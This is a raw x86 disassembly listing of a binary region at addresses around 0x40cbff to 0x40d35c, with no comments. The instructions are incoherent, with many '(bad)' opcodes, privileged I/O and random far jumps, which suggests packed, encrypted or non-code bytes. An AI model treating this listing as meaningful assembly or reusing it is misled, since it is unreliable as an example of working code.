  40cbff:	bound  ecx,QWORD PTR [esi+edi*2+0x7e7c387e]
  40cc06:	jle    0x40cc0c
  40cc08:	xchg   edx,eax
  40cc09:	add    eax,0x6c73d94
  40cc0e:	jl     0x40cbc0
  40cc10:	xchg   ecx,eax
  40cc11:	retf   
  40cc12:	pop    ds
  40cc13:	hlt    
  40cc14:	mov    ss,ebp
  40cc16:	pop    ecx
  40cc17:	mov    edx,0x34bdd2ec
  40cc1c:	cdq    
  40cc1d:	das    
  40cc1e:	cwde   
  40cc1f:	jge    0x40cbe9
  40cc21:	dec    ebp
  40cc22:	push   edi
  40cc23:	push   0x76
  40cc25:	in     al,0xd7
  40cc27:	inc    eax
  40cc28:	repnz sbb eax,0x447a419e
  40cc2e:	adc    DWORD PTR [edx+ebx*4-0xb],0xffffffa4
  40cc33:	mov    dh,0xb
  40cc35:	and    eax,0xc8112c0
  40cc3a:	mov    dl,0x46
  40cc3c:	xlat   BYTE PTR ds:[ebx]
  40cc3d:	sbb    ebp,DWORD PTR [edi+0x46]
  40cc40:	ret    
  40cc41:	sub    eax,0xce6a4e4
  40cc46:	mov    ah,0x6e
  40cc48:	cmp    DWORD PTR [ecx],ebp
  40cc4a:	push   edx
  40cc4b:	mov    dl,BYTE PTR [edi-0x3a]
  40cc4e:	loopne 0x40cc24
  40cc50:	sub    BYTE PTR [ebp+edx*1+0x3a],0x48
  40cc55:	mov    ds:0x44ae15f5,al
  40cc5a:	xchg   ch,bh
  40cc5c:	add    esp,DWORD PTR [ebx+0x816083f]
  40cc62:	(bad)  
  40cc63:	(bad)  
  40cc64:	add    DWORD PTR gs:[eax+0xe],edi
  40cc68:	popa   
  40cc69:	inc    ebp
  40cc6a:	mov    bl,0xe5
  40cc6c:	loopne 0x40cc0c
  40cc6e:	(bad)  
  40cc6f:	outs   dx,DWORD PTR ds:[esi]
  40cc70:	sub    bl,dl
  40cc72:	jge    0x40cc0c
  40cc74:	pop    ebx
  40cc75:	mov    DWORD PTR [eax+edx*8-0x3f],esi
  40cc79:	lods   al,BYTE PTR ds:[esi]
  40cc7a:	inc    ebp
  40cc7b:	pop    eax
  40cc7c:	push   cs
  40cc7d:	mov    al,0x38
  40cc7f:	stc    
  40cc80:	popf   
  40cc81:	retf   0x7f5d
  40cc84:	inc    esp
  40cc85:	xchg   BYTE PTR [ecx+0x6be1fc27],ah
  40cc8b:	push   es
  40cc8c:	icebp  
  40cc8d:	jge    0x40ccca
  40cc8f:	ins    BYTE PTR es:[edi],dx
  40cc90:	fcomp  DWORD PTR [ecx-0x5ff8004f]
  40cc96:	dec    ebx
  40cc97:	or     DWORD PTR [eax+0x28],ebp
  40cc9a:	mov    ebx,0xa971a82f
  40cc9f:	jno    0x40cc53
  40cca1:	fst    QWORD PTR [edx-0x7a]
  40cca4:	dec    ebp
  40cca5:	stc    
  40cca6:	add    DWORD PTR [ecx+0x39],ecx
  40cca9:	mov    bl,dl
  40ccab:	sti    
  40ccac:	fist   DWORD PTR [edx]
  40ccae:	sub    BYTE PTR [ebx-0x18],ah
  40ccb1:	ds idiv DWORD PTR ss:[edx-0x38114044]
  40ccb9:	dec    ecx
  40ccba:	mov    ah,0xfa
  40ccbc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ccbd:	mov    eax,ds:0xe47fcdc2
  40ccc2:	inc    esp
  40ccc3:	shl    DWORD PTR [esi+0x418bf7b3],cl
  40ccc9:	stos   DWORD PTR es:[edi],eax
  40ccca:	mov    bl,0x80
  40cccc:	pop    esp
  40cccd:	dec    esi
  40ccce:	sti    
  40cccf:	cmp    BYTE PTR [edx-0x29],dh
  40ccd2:	shr    BYTE PTR [esi+esi*4+0x23],0x4c
  40ccd7:	(bad)  
  40ccd8:	cld    
  40ccd9:	xor    al,0x4d
  40ccdb:	aam    0xb0
  40ccdd:	pusha  
  40ccde:	repnz lea dx,fs:[ebp+0x4]
  40cce4:	cli    
  40cce5:	arpl   WORD PTR [ebp-0x53f0b66e],dx
  40cceb:	and    ebx,ecx
  40cced:	sub    edx,esp
  40ccef:	int3   
  40ccf0:	cmp    DWORD PTR ds:0xf251da94,esi
  40ccf6:	dec    esi
  40ccf7:	cmc    
  40ccf8:	ss dec esp
  40ccfa:	xlat   BYTE PTR ds:[ebx]
  40ccfb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ccfc:	(bad)  
  40ccfd:	xor    esp,edx
  40ccff:	or     ebp,edx
  40cd01:	js     0x40cd5c
  40cd03:	and    eax,0xb229b84b
  40cd08:	or     BYTE PTR [ecx+0x71],0xf1
  40cd0c:	or     al,BYTE PTR [edi+0x7c93fec6]
  40cd12:	fdiv   st(1),st
  40cd14:	push   cs
  40cd15:	outs   dx,DWORD PTR ds:[esi]
  40cd16:	push   eax
  40cd17:	cmp    ecx,edx
  40cd19:	test   al,0xd5
  40cd1b:	adc    eax,ebx
  40cd1d:	jp     0x40cd21
  40cd1f:	jno    0x40ccd8
  40cd21:	and    BYTE PTR [eax+ebp*2-0x45],dl
  40cd25:	or     cl,BYTE PTR [ebp-0x3e3388f6]
  40cd2b:	dec    ebp
  40cd2c:	iret   
  40cd2d:	mov    al,0x69
  40cd2f:	sub    BYTE PTR [esi+ebp*2],al
  40cd32:	mov    BYTE PTR [ecx+0x38],dl
  40cd35:	xchg   ecx,eax
  40cd36:	mov    ebx,0x280c6803
  40cd3b:	mov    ebp,0xaa10ac64
  40cd40:	jne    0x40cd01
  40cd42:	gs inc eax
  40cd44:	dec    esp
  40cd45:	fstp   QWORD PTR [edi+0x2c]
  40cd48:	sbb    bh,BYTE PTR [ecx]
  40cd4a:	mov    ds:0x49ef663a,al
  40cd4f:	loopne 0x40cd16
  40cd51:	test   al,ch
  40cd53:	xchg   ecx,eax
  40cd54:	lods   al,BYTE PTR ds:[esi]
  40cd55:	adc    eax,0x96c8da69
  40cd5a:	mov    dl,0x3c
  40cd5c:	xor    eax,0x9d0825be
  40cd61:	(bad)  
  40cd62:	(bad)  
  40cd63:	cmp    ah,cl
  40cd65:	mov    ds:0x64b39f35,al
  40cd6a:	inc    ebx
  40cd6b:	les    ax,DWORD PTR [ecx+0x6]
  40cd6f:	retf   0xe7ac
  40cd72:	inc    edi
  40cd73:	or     al,0xc1
  40cd75:	iret   
  40cd76:	aad    0xf1
  40cd78:	scas   eax,DWORD PTR es:[edi]
  40cd79:	fwait
  40cd7a:	jl     0x40cdbe
  40cd7c:	gs push edi
  40cd7e:	xchg   ecx,eax
  40cd7f:	call   0xb1aafd10
  40cd84:	push   edi
  40cd85:	imul   esp,DWORD PTR [edi],0xffffffaf
  40cd88:	imul   edi,esp,0x1f407607
  40cd8e:	inc    BYTE PTR [ebx]
  40cd90:	ja     0x40cdad
  40cd92:	call   0x2c50:0xb37a7bfa
  40cd99:	rcr    bh,cl
  40cd9b:	mov    ecx,0xece5358d
  40cda0:	stos   DWORD PTR es:[edi],eax
  40cda1:	jl     0x40cda7
  40cda3:	jnp    0x40cdae
  40cda5:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cda7:	mov    dl,0x1c
  40cda9:	jns    0x40cda9
  40cdab:	(bad)  
  40cdac:	push   edi
  40cdad:	(bad)  
  40cdae:	sbb    dl,bl
  40cdb0:	ficom  WORD PTR [eax+ebp*1+0x15]
  40cdb4:	push   esp
  40cdb5:	jne    0x40ce36
  40cdb7:	mov    edi,0x3e201330
  40cdbc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cdbe:	repz adc dh,dl
  40cdc1:	add    al,0x4e
  40cdc3:	pop    es
  40cdc4:	icebp  
  40cdc5:	or     BYTE PTR [edi],bh
  40cdc7:	add    BYTE PTR [edx-0x410afb7f],bl
  40cdcd:	popa   
  40cdce:	xchg   ebx,ebp
  40cdd0:	test   DWORD PTR [edx-0x75a6a52e],ecx
  40cdd6:	clc    
  40cdd7:	lahf   
  40cdd8:	jmp    0x40ce4e
  40cdda:	cli    
  40cddb:	(bad)  
  40cddc:	js     0x40ce59
  40cdde:	loope  0x40cdf0
  40cde0:	add    al,0x7f
  40cde2:	fdivr  QWORD PTR [ecx+0x12]
  40cde5:	jge    0x40cd82
  40cde7:	and    edi,DWORD PTR [edx+ebx*8]
  40cdea:	popf   
  40cdeb:	pop    ds
  40cdec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cded:	lock or DWORD PTR [edi],ebp
  40cdf0:	mov    esp,0x82a0b351
  40cdf5:	push   cs
  40cdf6:	sub    ecx,DWORD PTR [ebx]
  40cdf8:	mov    bl,0x53
  40cdfa:	xor    ecx,DWORD PTR [ebx-0x38aed44a]
  40ce00:	jae    0x40ce32
  40ce02:	out    dx,eax
  40ce03:	out    dx,al
  40ce04:	and    dh,BYTE PTR [edx]
  40ce06:	ret    0x1142
  40ce09:	jbe    0x40cda9
  40ce0b:	jle    0x40ce38
  40ce0d:	iret   
  40ce0e:	pop    es
  40ce0f:	retf   
  40ce10:	test   BYTE PTR [ecx+ebp*8-0x387a94fe],bl
  40ce17:	retf   
  40ce18:	adc    bh,ah
  40ce1a:	iret   
  40ce1b:	dec    ebx
  40ce1c:	mov    esp,0xc66c7c0
  40ce21:	dec    esi
  40ce22:	lahf   
  40ce23:	(bad)  
  40ce24:	in     al,dx
  40ce25:	(bad)  
  40ce26:	pop    ds
  40ce27:	or     BYTE PTR [ecx-0x65],ch
  40ce2a:	xchg   esp,eax
  40ce2b:	hlt    
  40ce2c:	inc    ebx
  40ce2d:	inc    eax
  40ce2e:	adc    DWORD PTR [ecx],0xfffffffd
  40ce31:	cmp    eax,0x492aaae2
  40ce36:	mov    al,0x7f
  40ce38:	sub    BYTE PTR [ecx],bh
  40ce3a:	sbb    eax,ebp
  40ce3c:	cmp    DWORD PTR ds:0x4bea76b3,esp
  40ce42:	leave  
  40ce43:	je     0x40cdfb
  40ce45:	fcmovne st,st(1)
  40ce47:	mov    ds:0xd2f91b2c,eax
  40ce4c:	mov    edi,0xcb87d92b
  40ce51:	jmp    0x40d0b4
  40ce56:	push   ebx
  40ce57:	std    
  40ce58:	dec    ebx
  40ce59:	sahf   
  40ce5a:	push   ecx
  40ce5b:	push   0x84027173
  40ce60:	add    al,0xed
  40ce62:	push   eax
  40ce63:	push   esi
  40ce64:	es xchg ecx,eax
  40ce66:	sub    al,0x8b
  40ce68:	jle    0x40cee8
  40ce6a:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40ce6e:	dec    edx
  40ce6f:	nop
  40ce70:	xchg   edx,ebp
  40ce72:	test   cl,cl
  40ce74:	dec    esi
  40ce75:	jmp    0x40ce42
  40ce77:	das    
  40ce78:	pushf  
  40ce79:	out    dx,al
  40ce7a:	adc    esp,DWORD PTR [esi+0x6a]
  40ce7d:	addr16 push 0xfffffff5
  40ce80:	(bad)  ss:[edi+0x3e]
  40ce84:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  40ce86:	out    dx,al
  40ce87:	jae    0x40ce16
  40ce89:	enter  0xec0e,0xa8
  40ce8d:	xchg   edx,eax
  40ce8e:	add    BYTE PTR [edi+0x71],al
  40ce91:	stos   DWORD PTR es:[edi],eax
  40ce92:	mov    al,ds:0xb5b0cf5c
  40ce97:	int3   
  40ce98:	inc    eax
  40ce99:	cli    
  40ce9a:	repz hlt 
  40ce9c:	sub    al,0x69
  40ce9e:	jle    0x40cf12
  40cea0:	inc    esp
  40cea1:	in     eax,dx
  40cea2:	jbe    0x40ceec
  40cea4:	mov    bl,BYTE PTR [esi]
  40cea6:	retf   0x8beb
  40cea9:	jge    0x40ce57
  40ceab:	xor    DWORD PTR [eax],0x77dac4df
  40ceb1:	retf   0x743
  40ceb4:	cs scas al,BYTE PTR es:[edi]
  40ceb6:	or     eax,0xbc86ec8e
  40cebb:	mov    dl,0x23
  40cebd:	gs sahf 
  40cebf:	xchg   esp,eax
  40cec0:	jl     0x996bc221
  40cec6:	adc    DWORD PTR [edi-0x4d5fd8c1],ebp
  40cecc:	(bad)  
  40cece:	jp     0x40cecf
  40ced0:	js     0x40ce87
  40ced2:	push   esi
  40ced3:	lock hlt 
  40ced5:	loopne 0x40ce5d
  40ced7:	push   ebx
  40ced8:	mov    bh,bh
  40ceda:	test   DWORD PTR [edi+edx*8+0x625d82af],edi
  40cee1:	cmp    esp,0x22d40a0c
  40cee7:	cld    
  40cee8:	jge    0x40ce8e
  40ceea:	out    dx,al
  40ceeb:	add    edi,ebx
  40ceed:	in     eax,0xac
  40ceef:	ss inc eax
  40cef1:	into   
  40cef2:	lock cmc 
  40cef4:	inc    ecx
  40cef5:	xchg   esp,eax
  40cef6:	adc    edi,DWORD PTR [ecx]
  40cef8:	jo     0x40cf1c
  40cefa:	jb     0x40cec6
  40cefc:	push   ebp
  40cefd:	add    eax,0xa57cec7a
  40cf02:	fs out dx,eax
  40cf04:	shr    BYTE PTR [ecx],1
  40cf06:	out    0x7a,eax
  40cf08:	jge    0x40cf30
  40cf0a:	inc    edx
  40cf0b:	xor    eax,0xca3d8dee
  40cf10:	xor    dh,0xbc
  40cf13:	push   0xffffffe9
  40cf15:	pop    ss
  40cf16:	fisttp WORD PTR [edx]
  40cf18:	cmp    DWORD PTR [edi-0x6],esi
  40cf1b:	repz adc eax,DWORD PTR [ecx-0x37ec2193]
  40cf22:	or     ebx,DWORD PTR [esi]
  40cf24:	cli    
  40cf25:	idiv   DWORD PTR [ebx]
  40cf27:	xor    al,0x8a
  40cf29:	mov    ebp,0x30316ac
  40cf2e:	pusha  
  40cf2f:	es mov ch,0x73
  40cf32:	or     ch,bl
  40cf34:	cdq    
  40cf35:	scas   al,BYTE PTR es:[edi]
  40cf36:	int    0xc4
  40cf38:	les    ecx,FWORD PTR [edi+ebx*2+0x78e20f11]
  40cf3f:	dec    ecx
  40cf40:	xor    al,0xb5
  40cf42:	(bad)  
  40cf43:	icebp  
  40cf44:	dec    esi
  40cf45:	cld    
  40cf46:	jp     0x40cef7
  40cf48:	fs retf 0xa947
  40cf4c:	test   ebp,0xf9da432a
  40cf52:	mov    ebp,0x49ced279
  40cf57:	jmp    0x4793:0x7022ce5a
  40cf5e:	mov    cl,0x6b
  40cf60:	dec    edi
  40cf61:	mov    bh,0x3a
  40cf63:	pop    ds
  40cf64:	sub    BYTE PTR [eax],bh
  40cf66:	std    
  40cf67:	sbb    cl,BYTE PTR [edi+0x441ee4ce]
  40cf6d:	mov    ecx,0xe7ff3f25
  40cf72:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cf73:	push   esi
  40cf74:	push   0xffffffb4
  40cf76:	cld    
  40cf77:	or     eax,0x8f73d7a9
  40cf7c:	psrlq  mm1,QWORD PTR [ecx+0x4ec6a945]
  40cf83:	cmp    BYTE PTR [ebp-0x24],bl
  40cf86:	cmc    
  40cf87:	jne    0x40cf51
  40cf89:	mov    eax,ds:0x9ad5eb19
  40cf8e:	mov    ebp,DWORD PTR [eax-0x1d209e8]
  40cf94:	xchg   dh,ah
  40cf96:	sbb    DWORD PTR [edi-0x243ea5cc],esp
  40cf9c:	cmp    eax,0x9fa692f0
  40cfa1:	xor    eax,0xb98f1e3
  40cfa6:	jp     0x40d01f
  40cfa8:	pop    ss
  40cfa9:	xchg   edi,eax
  40cfaa:	sbb    al,0xd8
  40cfac:	cmp    DWORD PTR [eax-0x596ba873],0xffffffe1
  40cfb3:	xchg   esi,eax
  40cfb4:	fisub  DWORD PTR [eax-0x40]
  40cfb7:	xchg   ecx,eax
  40cfb8:	xor    DWORD PTR ds:0x2053c4f,esi
  40cfbe:	addr16 repnz pop eax
  40cfc1:	sub    ebp,eax
  40cfc3:	cmp    DWORD PTR [ebp+0x13c184d0],0x9e2b657a
  40cfcd:	stos   BYTE PTR es:[edi],al
  40cfce:	mov    edi,ecx
  40cfd0:	dec    BYTE PTR [ebx-0x69]
  40cfd3:	pop    es
  40cfd4:	xor    BYTE PTR [esi],ah
  40cfd6:	arpl   WORD PTR [edx+0x4f],cx
  40cfd9:	stos   BYTE PTR es:[edi],al
  40cfda:	xchg   ecx,eax
  40cfdb:	sub    ebx,DWORD PTR [edi+eax*2-0x3b731bda]
  40cfe2:	jecxz  0x40d002
  40cfe4:	cmp    DWORD PTR [ecx-0x27],esi
  40cfe7:	cmp    ebp,ebp
  40cfe9:	xchg   DWORD PTR [ebx+0xa7884e5],esp
  40cfef:	sbb    edx,ebp
  40cff1:	arpl   WORD PTR [esi+0x49],bp
  40cff4:	or     DWORD PTR ds:0xdc103fc3,ecx
  40cffa:	into   
  40cffb:	stc    
  40cffc:	call   0x6281:0x10db5e10
  40d003:	cld    
  40d004:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d005:	mov    cl,0x72
  40d007:	push   es
  40d008:	int3   
  40d009:	mov    bh,0xc8
  40d00b:	shr    DWORD PTR [ebx-0x51],1
  40d00e:	inc    esp
  40d00f:	rcl    DWORD PTR [edx],0x3f
  40d012:	pop    ecx
  40d013:	mov    eax,ds:0x7dbe2208
  40d018:	jp     0x40d06a
  40d01a:	mov    bl,BYTE PTR [ebp-0x58687709]
  40d020:	push   ss
  40d021:	sbb    BYTE PTR [ecx],ah
  40d023:	jne    0x40d02f
  40d025:	pop    esp
  40d026:	push   0xe393f8c6
  40d02b:	add    bh,BYTE PTR [ebx+0x31]
  40d02e:	xchg   esi,eax
  40d02f:	adc    ch,BYTE PTR ss:[esi+0x32]
  40d033:	xchg   esi,eax
  40d034:	inc    eax
  40d035:	push   ss
  40d036:	mov    edx,DWORD PTR [ebp-0x44a14852]
  40d03c:	cmc    
  40d03d:	shl    bh,1
  40d03f:	cmp    al,0xd8
  40d041:	ins    DWORD PTR es:[edi],dx
  40d042:	cmp    eax,0x47fd42b2
  40d047:	(bad)  
  40d049:	daa    
  40d04a:	xor    BYTE PTR [edx],al
  40d04c:	add    al,0x18
  40d04e:	jne    0x40d0cd
  40d050:	mov    ecx,0x4285089f
  40d055:	repnz xchg bl,bl
  40d058:	cli    
  40d059:	inc    edi
  40d05a:	(bad)  
  40d05b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d05c:	mov    al,0xa8
  40d05e:	addr16 xchg edx,ebp
  40d061:	inc    edi
  40d062:	addr16 stc 
  40d064:	or     ah,ch
  40d066:	sub    bh,BYTE PTR [esi+0x6097ea93]
  40d06c:	mov    ebx,0xa329c351
  40d071:	jge    0x40d0e7
  40d073:	cmp    dh,BYTE PTR [ebx+0x4e]
  40d076:	call   0xedd2:0xd161fc33
  40d07d:	sbb    esi,DWORD PTR [ecx]
  40d07f:	xlat   BYTE PTR ds:[ebx]
  40d080:	add    edx,DWORD PTR [ecx]
  40d082:	jo     0x40d006
  40d084:	xor    al,0x9c
  40d086:	adc    BYTE PTR [esi-0x5b],al
  40d089:	in     eax,dx
  40d08a:	mov    ebp,0x5488594a
  40d08f:	icebp  
  40d090:	xchg   esi,eax
  40d091:	loopne 0x40d076
  40d093:	mov    ebx,0x74947520
  40d098:	mov    dh,0x5f
  40d09a:	hlt    
  40d09b:	cwde   
  40d09c:	adc    ecx,edx
  40d09e:	lods   eax,DWORD PTR ds:[esi]
  40d09f:	cwde   
  40d0a0:	mov    ebp,0xa5e63e8c
  40d0a5:	pusha  
  40d0a6:	mov    ebp,0x7d9bea02
  40d0ab:	mov    ebp,0xa5afe186
  40d0b0:	adc    BYTE PTR [esi],cl
  40d0b2:	and    bh,0x49
  40d0b5:	mov    eax,DWORD PTR [ebp-0x1c]
  40d0b8:	imul   eax,ecx
  40d0bb:	add    esp,eax
  40d0bd:	xchg   edx,eax
  40d0be:	jmp    0x40d321
  40d0c3:	sahf   
  40d0c4:	test   BYTE PTR [edi],0xc3
  40d0c7:	push   edi
  40d0c8:	repz pop edx
  40d0ca:	jae    0x40d0bf
  40d0cc:	ficom  WORD PTR [edx+0x6a]
  40d0cf:	sub    eax,0xf6a1e1f5
  40d0d4:	mov    DWORD PTR [esi+0x7e],edi
  40d0d7:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40d0db:	pop    ss
  40d0dc:	mov    eax,ds:0x10690fb6
  40d0e1:	and    eax,0x6b12c28e
  40d0e6:	cwde   
  40d0e7:	add    BYTE PTR [ebx+0x1b7781a4],ah
  40d0ed:	push   edi
  40d0ee:	pop    edx
  40d0ef:	jg     0x40d0f4
  40d0f1:	ror    dh,cl
  40d0f3:	fstp   TBYTE PTR [ebp-0x55]
  40d0f6:	sbb    al,0x5f
  40d0f8:	je     0x40d122
  40d0fa:	jmp    0x40d144
  40d0fc:	inc    ebp
  40d0fd:	das    
  40d0fe:	leave  
  40d0ff:	in     eax,0x3f
  40d101:	inc    ebp
  40d102:	mov    BYTE PTR [ebp+0x66921050],al
  40d108:	(bad)  
  40d109:	(bad)  
  40d10a:	imul   esi,DWORD PTR [esi],0x67
  40d10d:	jp     0x40d181
  40d10f:	ins    BYTE PTR es:[edi],dx
  40d110:	mov    ebp,0xc7ed2114
  40d115:	sub    DWORD PTR [esi-0x44],esp
  40d118:	notrack jmp DWORD PTR [ecx-0x7e]
  40d11c:	xabort 0x9b
  40d11f:	inc    eax
  40d120:	xchg   ebx,eax
  40d121:	mov    esp,0x6ececb77
  40d126:	mov    edi,0x881b5cfc
  40d12b:	test   BYTE PTR [ebx-0x5e926c1e],0x8c
  40d132:	sbb    al,0x37
  40d134:	les    ecx,FWORD PTR [ebx-0x5aafbd68]
  40d13a:	(bad)  [ebp-0x1e31cb95]
  40d140:	adc    ch,bl
  40d142:	xor    edx,ebp
  40d144:	rol    BYTE PTR [ebp+0x7f7cb522],0x16
  40d14b:	loop   0x40d1bf
  40d14d:	mov    esi,0x7c059baf
  40d152:	xchg   ebp,eax
  40d153:	sub    BYTE PTR [ebp-0x10142a86],0xec
  40d15a:	inc    ebp
  40d15b:	jmp    0xe7d0e79
  40d160:	sbb    DWORD PTR [edi],0xffffffe7
  40d163:	xchg   esi,eax
  40d164:	in     al,dx
  40d165:	xchg   ebx,eax
  40d166:	pop    edi
  40d167:	pop    ds
  40d168:	sub    DWORD PTR [ebp+0x2bf4da5c],esi
  40d16e:	imul   edx,DWORD PTR [esi+ebp*4-0x12],0x14b111c1
  40d176:	test   al,0x95
  40d178:	and    DWORD PTR [edi+eiz*8+0x15],0xb403f616
  40d180:	fistp  DWORD PTR [eax+0x71]
  40d183:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d184:	pop    ds
  40d185:	push   esi
  40d186:	cld    
  40d187:	push   edi
  40d188:	push   edi
  40d189:	daa    
  40d18a:	push   esi
  40d18b:	mov    cl,0x2b
  40d18d:	lods   al,BYTE PTR ds:[esi]
  40d18e:	ja     0x40d1fe
  40d190:	(bad)  
  40d191:	int    0xc4
  40d193:	ffreep st(3)
  40d195:	ins    DWORD PTR es:[edi],dx
  40d196:	lahf   
  40d197:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d198:	outs   dx,BYTE PTR ds:[esi]
  40d199:	fsub   QWORD PTR [eax+0x6852414b]
  40d19f:	clc    
  40d1a0:	out    0xc3,al
  40d1a2:	xor    eax,0xb4c568ec
  40d1a7:	int    0xca
  40d1a9:	adc    esp,DWORD PTR [edi]
  40d1ab:	sub    al,0x44
  40d1ad:	cmp    eax,0x9cdd7406
  40d1b2:	mov    dh,0xb1
  40d1b4:	ret    0xd290
  40d1b7:	jmp    0x6a79787c
  40d1bc:	xor    ebp,DWORD PTR [edi-0x4d571a8b]
  40d1c2:	ss jbe 0x40d156
  40d1c5:	mov    cl,0x54
  40d1c7:	mov    BYTE PTR [ecx],bl
  40d1c9:	push   0xaaa57f52
  40d1ce:	push   ebp
  40d1cf:	xchg   edi,eax
  40d1d0:	das    
  40d1d1:	cmp    BYTE PTR [eax-0x7155c567],0x31
  40d1d8:	pop    edi
  40d1d9:	adc    bh,BYTE PTR [eax+0x10]
  40d1dc:	push   0xf15af0ea
  40d1e1:	jmp    0x3e2db2be
  40d1e6:	and    eax,0x14a29330
  40d1eb:	rcr    DWORD PTR [ebx+ebx*4+0x38ddf6e],cl
  40d1f2:	ja     0x40d208
  40d1f4:	cmovl  esp,DWORD PTR [ecx+0x72]
  40d1f8:	stos   DWORD PTR es:[edi],eax
  40d1f9:	sub    eax,edi
  40d1fb:	jno    0x40d21c
  40d1fd:	and    DWORD PTR [edx],0x2dd8874e
  40d203:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d204:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d205:	clc    
  40d206:	jno    0x40d1a0
  40d208:	les    ebp,FWORD PTR [eax+0x75d58c04]
  40d20e:	mov    DWORD PTR [esi],edx
  40d210:	cli    
  40d211:	cwde   
  40d212:	push   0x233e3d22
  40d217:	pop    ebp
  40d218:	jbe    0x40d26f
  40d21a:	xor    BYTE PTR [edx-0x48],0xf0
  40d21e:	iret   
  40d21f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d220:	and    eax,0xa870c982
  40d225:	retf   0x26f2
  40d228:	jo     0x40d1d8
  40d22a:	lds    ebx,FWORD PTR [ebx+0x7d244d42]
  40d230:	jb     0x40d266
  40d232:	ret    0xd1
  40d235:	jg     0x40d252
  40d237:	xor    DWORD PTR [ebp-0x9],ebx
  40d23a:	leave  
  40d23b:	jp     0x40d20d
  40d23d:	sbb    edi,DWORD PTR [esi]
  40d23f:	xchg   bx,ax
  40d241:	shr    esp,1
  40d243:	adc    BYTE PTR [ebp-0x60a44a6a],al
  40d249:	(bad)  
  40d24b:	xor    BYTE PTR [esi],0x16
  40d24e:	push   0x511b3216
  40d253:	lock daa 
  40d255:	jle    0x40d281
  40d257:	rcl    DWORD PTR [esi],cl
  40d259:	mov    edx,0x68126d2b
  40d25e:	loope  0x40d24f
  40d260:	in     al,0x95
  40d262:	pop    ds
  40d263:	mov    edi,0xbe214608
  40d268:	xor    BYTE PTR [ebp-0x4f],dh
  40d26b:	xor    al,BYTE PTR [eax-0x665877a2]
  40d271:	das    
  40d272:	les    ebx,FWORD PTR ds:0x959be78f
  40d278:	dec    edi
  40d279:	mov    bl,0x91
  40d27b:	jae    0x40d287
  40d27d:	xchg   esp,eax
  40d27e:	adc    BYTE PTR [ebp-0x2e],bh
  40d281:	fiadd  DWORD PTR [esi+0x47]
  40d284:	cld    
  40d285:	cdq    
  40d286:	and    BYTE PTR [edi-0x14ece038],al
  40d28c:	in     eax,0x94
  40d28e:	xor    ch,ah
  40d290:	add    esi,ecx
  40d292:	popa   
  40d293:	dec    esi
  40d294:	adc    BYTE PTR [esi],0xe4
  40d297:	mov    al,ds:0x85b261e0
  40d29c:	add    ecx,DWORD PTR [eax]
  40d29e:	dec    ebp
  40d29f:	mov    ah,0x8b
  40d2a1:	sbb    DWORD PTR [edi],esp
  40d2a3:	aaa    
  40d2a4:	loop   0x40d312
  40d2a6:	cmp    BYTE PTR [eax-0x1f4bd2b4],bl
  40d2ac:	ins    DWORD PTR es:[edi],dx
  40d2ad:	inc    edi
  40d2ae:	loop   0x40d2be
  40d2b0:	rcl    BYTE PTR [ecx-0x30],0x6f
  40d2b4:	scas   eax,DWORD PTR es:[edi]
  40d2b5:	dec    edx
  40d2b6:	xchg   ebx,eax
  40d2b7:	fist   WORD PTR [esi]
  40d2b9:	outs   dx,DWORD PTR ds:[esi]
  40d2ba:	pop    ecx
  40d2bb:	sbb    bh,BYTE PTR [ebp+0x7630ded2]
  40d2c1:	push   ds
  40d2c2:	out    0xd7,al
  40d2c4:	or     bh,ch
  40d2c6:	popa   
  40d2c7:	call   0x1139:0xaa2ca1d2
  40d2ce:	je     0x40d31e
  40d2d0:	mov    ch,BYTE PTR [edi-0x792d4f46]
  40d2d6:	jae    0x40d341
  40d2d8:	rcpps  xmm0,XMMWORD PTR [edx]
  40d2db:	test   BYTE PTR [ecx+0x67],dl
  40d2de:	cmp    ah,BYTE PTR [ebp-0x88184d1]
  40d2e4:	adc    esi,DWORD PTR [esi-0x63b19ac2]
  40d2ea:	sub    al,0x66
  40d2ec:	(bad)  
  40d2ed:	cli    
  40d2ee:	sub    BYTE PTR [ecx-0x63],0x25
  40d2f2:	push   ebp
  40d2f3:	out    0x7b,al
  40d2f5:	xor    al,0x8
  40d2f7:	call   0xf47e:0x27149d75
  40d2fe:	adc    al,0xa0
  40d300:	pop    ebp
  40d301:	ret    0x5115
  40d304:	pop    esi
  40d305:	sbb    al,0xf5
  40d307:	test   eax,0x5678369b
  40d30c:	inc    edx
  40d30d:	data16 xor BYTE PTR [edx-0x43571c18],dh
  40d314:	dec    esp
  40d315:	inc    ebp
  40d316:	ds mov bl,0xa9
  40d319:	cmp    esi,ebx
  40d31b:	sbb    al,0xfe
  40d31d:	jg     0x40d39c
  40d31f:	loope  0x40d301
  40d321:	push   eax
  40d322:	xor    ebx,ebx
  40d324:	mov    edx,esp
  40d326:	dec    edx
  40d327:	jmp    0x40d58a
  40d32c:	fwait
  40d32d:	push   es
  40d32e:	mov    bl,0x2a
  40d330:	mov    bl,0xab
  40d332:	mov    ds:0x57b64c97,eax
  40d337:	pop    ebx
  40d338:	hlt    
  40d339:	fimul  WORD PTR [esi]
  40d33b:	sub    esi,DWORD PTR [eax+0x387e7e97]
  40d341:	jl     0x40d3c1
  40d343:	jle    0x40d327
  40d345:	bound  esp,QWORD PTR [esi-0x2]
  40d348:	adc    BYTE PTR [ebx+eax*4],dh
  40d34b:	xchg   BYTE PTR [eax+0x5a],cl
  40d34e:	and    al,ch
  40d350:	cdq    
  40d351:	call   0xcd0bb2e2
  40d356:	sbb    BYTE PTR [esi],0xfa
  40d359:	push   ebx
  40d35a:	mov    ch,bh
  40d35c:	xchg   BYTE PTR [eax+eiz*1+0x1324770e],bl
